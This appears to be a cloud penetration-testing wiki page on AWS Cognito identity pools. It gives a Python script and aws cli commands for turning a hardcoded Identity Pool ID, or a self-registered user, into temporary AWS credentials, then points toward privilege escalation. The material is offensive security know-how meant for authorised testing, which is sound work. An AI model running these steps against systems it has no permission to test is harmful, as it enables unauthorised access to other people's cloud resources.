## Basic Information

With an identity pool, your users can **obtain temporary AWS credentials to access AWS services**, such as Amazon S3 and DynamoDB. Identity pools support anonymous guest users, as well as the following identity providers that you can use to authenticate users for identity pools:

* Amazon Cognito user pools
* Social sign-in with Facebook, Google, Login with Amazon, and Sign in with Apple
* OpenID Connect (OIDC) providers
* SAML identity providers
* Developer authenticated identities

## Accessing IAM Roles

### Unauthenticated

The only thing an attacker need to know to **get AWS credentials** in a Cognito app as unauthenticated user is the **Identity Pool ID**, and this **ID must be hardcoded** in the web/mobile **application** for it to use it. An ID looks like this: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (it's not bruteforceable).

If you find an Identity Pools ID hardcoded and it allows unauthenticated users, you can get AWS credentials with:

```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
    print(f"Not valid id: {id_pool_id}")
    exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```

Or you could use the following **aws cli commands**:

```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id>
aws cognito-identity get-credentials-for-identity --identity-id <identity_id>
```

{% hint style="info" %}
Remember that **authenticated users** will be probably granted **different permissions**, so if you can **sign up inside the app**, try doing that and get the new credentials.
{% endhint %}

Having a set of IAM credentials you should check [which access you have](../../#whoami) and try to [escalate privileges](../../aws-privilege-escalation/).

### Authenticated

There could also be **roles** available for **authenticated users accessing the Identity Poo**l.

For this you might need to have access to the identity provider. If that it a Cognito User Pool, maybe you can abuse the default behaviour and create a new user yourself.

Anyway, the **following example** expects that you have already logged in inside a **Cognito User Pool** used to access the Identity Pool (don't forget that other types of identity providers could also be configured).

```bash
# In this step you should have already an ID Token
aws cognito-identity get-id \
    --identity-pool-id <id_pool_id> \
    --logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
    --identity-id <identity_id> \
    --logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
    
```

{% hint style="warning" %}
It's possible to **configure different IAM roles depending on the identity provide**r the user is being logged in or even just depending **on the user** (using claims). Therefore, if you have access to different users through the same or different providers, if might be **worth it to login and access the IAM roles of all of them**.
{% endhint %}
